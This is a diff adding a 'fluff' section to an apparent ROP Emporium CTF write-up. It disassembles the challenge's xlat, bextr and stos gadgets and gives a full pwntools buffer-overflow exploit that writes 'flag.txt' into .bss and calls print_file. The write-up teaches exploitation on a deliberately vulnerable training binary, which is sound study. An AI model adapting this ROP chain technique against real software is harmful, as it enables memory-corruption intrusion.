@@ -252,6 +252,77 @@ io.interactive()
 
 ## fluff
 
+in this challenge most of the useful gadgets provided to us are gone, instead we have some obscure gadgets gathered in `usefulFunction()`
+
+```
+pwndbg> disas questionableGadgets
+Dump of assembler code for function questionableGadgets:
+   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]
+   0x0000000000400629 <+1>:     ret
+   0x000000000040062a <+2>:     pop    rdx
+   0x000000000040062b <+3>:     pop    rcx
+   0x000000000040062c <+4>:     add    rcx,0x3ef2
+   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
+   0x0000000000400638 <+16>:    ret
+   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al
+   0x000000000040063a <+18>:    ret
+   0x000000000040063b <+19>:    nop    DWORD PTR [rax+rax*1+0x0]
+End of assembler dump.
+```
+1. `bextr rbx, rcx, rdx`: this gadget controls the rbx register. bextr extracts bits from rcx based on the control value in rdx. By popping 0x4000 into rdx (start at bit 0, extract 64 bits), the instruction simply copies rcx into rbx. because the gadget adds 0x3ef2 to rcx before the copy, we have to substract 0x3ef2 from the target value before pushing it to the stack to cancel out the addition
+2. `xlat BYTE PTR ds:[rbx]`: xlat adds rbx and al together, treats the sum as a memory address, reads the byte at that address, and places it into al. We use this to pull characters (every flag character we wrote into memory) that already exist inside the binary's memory into the al register
+3. `stos BYTE PTR es:[rdi],al`: stos writes the byte currently in al to the memory address stored in rdi, it then automatically increments rdi by 1, perfectly positioning the pointer for the next byte write
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+elf = ELF('./fluff')
+rop = ROP(elf)
+io = process(elf.path)
+
+off = 40
+bss = elf.bss()
+flag = b'flag.txt'
+print_file = elf.plt['print_file']
+pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+xlatb_rbx = 0x400628
+bextr_rbx_rcx_rdx  = 0x40062a
+stosb_rdi_al  = 0x400639
+
+payload = b'A' * off
+payload += p64(pop_rdi)
+payload += p64(bss)
+
+al = 0xb
+
+for char in flag:
+	char_addr = next(elf.search(bytes([char])))
+	req_rbx = char_addr - al
+	
+	payload += p64(bextr_rbx_rcx_rdx)
+	payload += p64(0x4000)
+	payload += p64(req_rbx - 0x3ef2)
+
+	payload += p64(xlatb_rbx)
+
+	payload += p64(stosb_rdi_al)
+
+	al = char
+
+payload += p64(pop_rdi)
+payload += p64(bss)
+payload += p64(ret)
+payload += p64(print_file)
+
+io.recvuntil(b'> ')
+io.sendline(payload)
+
+io.interactive()
+```
 ## pivot
 
 ## ret2csu
